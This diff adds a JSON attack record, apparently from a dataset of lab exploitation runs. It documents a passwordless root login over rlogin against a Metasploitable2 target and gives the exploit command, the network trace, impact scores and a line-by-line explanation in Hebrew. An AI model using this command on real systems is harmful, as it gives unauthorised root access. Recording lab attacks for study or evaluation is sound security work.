@@ -1,0 +1,71 @@
+{
+  "attack_id": "RLOGIN-20250325-214837",
+  "target": {
+    "ip": "192.168.56.101",
+    "os": "Linux",
+    "vendor": "Ubuntu 8.04 (Metasploitable2)",
+    "services": [
+      {
+        "port": 513,
+        "service": "rlogin",
+        "version": "OpenBSD rlogind"
+      }
+    ],
+    "cpe_list": ["cpe:/o:ubuntu:ubuntu:8.04", "cpe:/a:openbsd:rlogind"],
+    "known_vulnerabilities": [],
+    "system_context_notes": "rlogin enabled with root trust, likely due to /etc/hosts.equiv misconfiguration"
+  },
+  "exploit_metadata": {
+    "exploit_id": "RLOGIN-BASIC-001",
+    "exploit_title": "Remote Root Login via rlogin Trust Misconfiguration",
+    "cve_id": null,
+    "exploit_language": null,
+    "exploit_type": "Authentication Bypass via rlogin trust",
+    "source": "manual",
+    "exploit_path": null
+  },
+  "exploit_code_raw": "rlogin 192.168.56.101 -l root  # No password required due to trust misconfiguration",
+  "runtime_behavior": {
+    "files_created": [],
+    "connections_made": [
+      "192.168.56.1:1022 → 192.168.56.101:513",
+      "192.168.56.101:513 → 192.168.56.1:1022"
+    ],
+    "processes_spawned": [],
+    "syscalls_trace": [],
+    "anti_detection_evasion": [],
+    "network_trace_file": "attack_rlogin_20250325_214837.pcap",
+    "tcp_session": {
+      "total_packets": 21,
+      "duration_seconds": 8.02,
+      "flags_observed": ["S", "SA", "A", "PA", "FA", "PAU"],
+      "max_payload_size": 521,
+      "avg_payload_size": 30.1,
+      "initial_payload_preview": "6d656e6173686500726f6f7400787465726d2d6b"
+    }
+  },
+  "attack_impact": {
+    "success": true,
+    "access_level": "root",
+    "shell_opened": true,
+    "persistence_achieved": false,
+    "data_exfiltrated": [],
+    "log_files_modified": [],
+    "detected_by_defenses": false,
+    "quality_score": 0.92
+  },
+  "exploit_analysis_detailed": [
+    {
+      "line": "rlogin 192.168.56.101 -l root",
+      "explanation": "פותחת סשן רשת למשתמש root דרך פרוטוקול rlogin",
+      "purpose": "קבלת גישה מרחוק ללא צורך בסיסמה, עקב הגדרת אמון",
+      "impact": "מאפשרת כניסה כ-root ללא אימות",
+      "critical": true,
+      "used_in_execution": true,
+      "affected_payload": false,
+      "modified_target_state": true,
+      "depends_on": [],
+      "line_effectiveness_score": 1.0
+    }
+  ]
+}
